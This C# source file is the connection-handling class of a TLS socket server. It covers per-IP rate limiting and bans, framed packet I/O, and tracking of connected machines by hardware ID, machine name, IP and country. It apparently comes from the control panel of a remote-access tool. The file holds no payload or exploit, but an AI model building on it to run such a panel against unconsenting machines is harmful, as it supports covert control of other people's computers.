using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using Server.Connectings.Events;
using Server.Data;
using Server.Helper;
using Server.Messages;

namespace Server.Connectings;

public class Clients
{
	public delegate void Delegate1();

	public delegate void Delegate(long bytes);

	private static readonly ConcurrentDictionary<string, int> _connectionAttempts;

	private static readonly ConcurrentDictionary<string, long> _connectionTimestamps;

	private static readonly TimeSpan _connectionAttemptWindow;

	private const int MaxConnectionAttempts = 50;

	private static readonly TimeSpan _banDuration;

	private static readonly ConcurrentDictionary<string, DateTime> _bannedIPs;

	private long _lastDataReceivedTime = Stopwatch.GetTimestamp();

	private long _dataReceived;

	private const long DataRateLimit = 10485760L;

	private const long RateCheckInterval = 1000L;

	public Delegate Sents;

	public Delegate Recevied;

	private byte[] ClientBuffer { get; set; }

	private int HeaderSize { get; set; }

	private int Offset { get; set; }

	private bool ClientBufferRecevied { get; set; }

	private object SendSync { get; set; }

	private SslStream SslClient { get; set; }

	public LastPing lastPing { get; set; }

	public Socket Tcp { get; private set; }

	public string IP { get; private set; }

	public bool itsConnect { get; private set; }

	public bool Auth { get; private set; }

	public string Hwid { get; set; }

	public bool IsNewUser { get; set; }

	public string UserMachine { get; set; }

	public string RealIP { get; set; }

	public object Tag { get; set; }

	public Clients ReportWindow { get; set; }

	public event EventHandler<EventDisconnect> eventDisconnect;

	private static bool IsLocalhost(string ip)
	{
		if (string.IsNullOrEmpty(ip))
		{
			return false;
		}
		string s = ip.Trim();
		if (!(s == "127.0.0.1") && !(s == "::1") && !s.StartsWith("127.") && !(s == "[::1]"))
		{
			return s.StartsWith("[::1]");
		}
		return true;
	}

	static Clients()
	{
		_connectionAttempts = new ConcurrentDictionary<string, int>();
		_connectionTimestamps = new ConcurrentDictionary<string, long>();
		_connectionAttemptWindow = TimeSpan.FromMinutes(1.0);
		_banDuration = TimeSpan.FromSeconds(30.0);
		_bannedIPs = new ConcurrentDictionary<string, DateTime>();
		Task.Run(async delegate
		{
			while (true)
			{
				await Task.Delay(TimeSpan.FromMinutes(1.0));
				DateTime now = DateTime.UtcNow;
				KeyValuePair<string, DateTime>[] array = _bannedIPs.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					KeyValuePair<string, DateTime> entry = array[i];
					if (now - entry.Value > _banDuration)
					{
						_bannedIPs.TryRemove(entry.Key, out var _);
					}
				}
			}
		});
	}

	public Clients(Socket Tcp)
	{
		string ip = ((IPEndPoint)Tcp.RemoteEndPoint).Address.ToString();
		if (!IsLocalhost(ip))
		{
			if (_bannedIPs.TryGetValue(ip, out var banTime))
			{
				if (DateTime.UtcNow - banTime < _banDuration)
				{
					Tcp.Close();
					return;
				}
				_bannedIPs.TryRemove(ip, out var _);
			}
			long nowTicks = Stopwatch.GetTimestamp();
			long windowStart = nowTicks - _connectionAttemptWindow.Ticks;
			_connectionTimestamps[ip] = nowTicks;
			int attempts = _connectionAttempts.AddOrUpdate(ip, 1, (string k, int v) => _connectionTimestamps.Where((KeyValuePair<string, long> x) => x.Key == ip && x.Value >= windowStart).Count() + 1);
			if (attempts > 50)
			{
				Methods.AppendLogs("AntiDDoS", $"RCE Attack Blocked! IP {ip} - Too many connections ({attempts} per minute)", Color.Red);
				_bannedIPs[ip] = DateTime.UtcNow;
				Tcp.Close();
				return;
			}
		}
		itsConnect = true;
		this.Tcp = Tcp;
		SslClient = new SslStream(new NetworkStream(Tcp, ownsSocket: true), leaveInnerStreamOpen: false);
		SslClient.BeginAuthenticateAsServer(Certificate.certificate, clientCertificateRequired: false, SslProtocols.Tls12, checkCertificateRevocation: false, EndAuthenticate, null);
		IP = ip;
		SendSync = new object();
		lastPing = new LastPing(this);
	}

	private void EndAuthenticate(IAsyncResult ar)
	{
		try
		{
			SslClient.EndAuthenticateAsServer(ar);
			Offset = 0;
			HeaderSize = 4;
			ClientBuffer = new byte[HeaderSize];
			Auth = true;
			SocketData.ConnectsPluse();
			SslClient.BeginRead(ClientBuffer, Offset, HeaderSize, ReadData, null);
		}
		catch (Exception)
		{
			Disconnect();
		}
	}

	public void Disconnect()
	{
		if (!itsConnect)
		{
			return;
		}
		if (Auth)
		{
			SocketData.ConnectsMinuse();
		}
		Form1 form = Program.form;
		if (form != null && form.settings?.Notificator == true && Auth && Tag != null && Tag is DataGridViewRow)
		{
			string country = "";
			DataGridViewRow row = (DataGridViewRow)Tag;
			if (row.Cells.Count > 2)
			{
				country = row.Cells[2].Value?.ToString() ?? "";
			}
			WindowsNotifier.ShowDisconnectionNotification(RealIP, UserMachine, country, Hwid);
		}
		if (this.eventDisconnect != null)
		{
			this.eventDisconnect(this, new EventDisconnect
			{
				clients = this
			});
		}
		itsConnect = false;
		ClientBuffer = null;
		HeaderSize = 0;
		Offset = 0;
		Tcp?.Dispose();
		SslClient?.Dispose();
		this.lastPing?.Disconnect();
		if (Tag != null && Tag is DataGridViewRow)
		{
			DataGridViewRow row2 = (DataGridViewRow)Tag;
			DataGridView datagrid = row2.DataGridView;
			if (row2.Cells.Count > 12 && !string.IsNullOrEmpty(Hwid))
			{
				Methods.AppendLogs("Client " + IP + " " + UserMachine + " " + Hwid, "Disconnect", Color.Red);
			}
			if (datagrid != null)
			{
				datagrid.Invoke((MethodInvoker)delegate
				{
					datagrid.Rows.Remove(row2);
				});
			}
			row2.Dispose();
		}
		if (ReportWindow != null)
		{
			ReportWindow.Disconnect();
		}
	}

	private void CheckDataRate()
	{
		long now = Stopwatch.GetTimestamp();
		long elapsed = (now - _lastDataReceivedTime) * 1000 / Stopwatch.Frequency;
		if (elapsed >= 1000)
		{
			if ((double)_dataReceived * 1000.0 / (double)elapsed > 10485760.0)
			{
				Disconnect();
				return;
			}
			_dataReceived = 0L;
			_lastDataReceivedTime = now;
		}
	}

	private void ReadData(IAsyncResult ar)
	{
		if (!itsConnect)
		{
			return;
		}
		try
		{
			int num = SslClient.EndRead(ar);
			if (num > 0)
			{
				Interlocked.Add(ref _dataReceived, num);
				CheckDataRate();
				if (Recevied != null)
				{
					Recevied(num);
				}
				SocketData.ReciveData(num);
				HeaderSize -= num;
				Offset += num;
				if (lastPing != null)
				{
					lastPing.Last();
				}
				if (!ClientBufferRecevied)
				{
					if (HeaderSize == 0)
					{
						HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
						if (HeaderSize > 0)
						{
							ClientBuffer = new byte[HeaderSize];
							Offset = 0;
							ClientBufferRecevied = true;
						}
					}
					else if (HeaderSize < 0)
					{
						Disconnect();
						return;
					}
				}
				else if (HeaderSize == 0)
				{
					new Packet().Read(this, ClientBuffer);
					Offset = 0;
					HeaderSize = 4;
					ClientBuffer = new byte[HeaderSize];
					ClientBufferRecevied = false;
				}
				else if (HeaderSize < 0)
				{
					Disconnect();
					return;
				}
				SslClient.BeginRead(ClientBuffer, Offset, HeaderSize, ReadData, null);
			}
			else
			{
				Disconnect();
			}
		}
		catch (Exception)
		{
			Disconnect();
		}
	}

	public void Send(object[] Data)
	{
		Send(LEB128.Write(Data));
	}

	public void Send(byte[] Data)
	{
		if (!itsConnect)
		{
			return;
		}
		lock (SendSync)
		{
			try
			{
				byte[] bytes = BitConverter.GetBytes(Data.Length);
				byte[] array = new byte[4 + Data.Length];
				Array.Copy(bytes, 0, array, 0, bytes.Length);
				Array.Copy(Data, 0, array, 4, Data.Length);
				Tcp.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(array, 0, array.Length);
				SslClient.Flush();
				if (Sents != null)
				{
					Sents(array.Length);
				}
				SocketData.SentData(array.Length);
			}
			catch (Exception)
			{
				Disconnect();
			}
		}
	}

	public void SendChunk(object[] Data)
	{
		Send(LEB128.Write(Data));
	}

	public void SendChunk(byte[] Data)
	{
		if (!itsConnect)
		{
			return;
		}
		lock (SendSync)
		{
			try
			{
				if (Data.Length < 16384)
				{
					Send(Data);
					return;
				}
				byte[] bytes = BitConverter.GetBytes(Data.Length);
				byte[] array = new byte[4 + Data.Length];
				Array.Copy(bytes, 0, array, 0, bytes.Length);
				Array.Copy(Data, 0, array, 4, Data.Length);
				using MemoryStream memoryStream = new MemoryStream(array);
				memoryStream.Position = 0L;
				byte[] array2 = new byte[16384];
				int num;
				while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
				{
					Tcp.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(array2, 0, num);
					SslClient.Flush();
					if (Sents != null)
					{
						Sents(num);
					}
				}
			}
			catch (Exception)
			{
				Disconnect();
			}
		}
	}
}
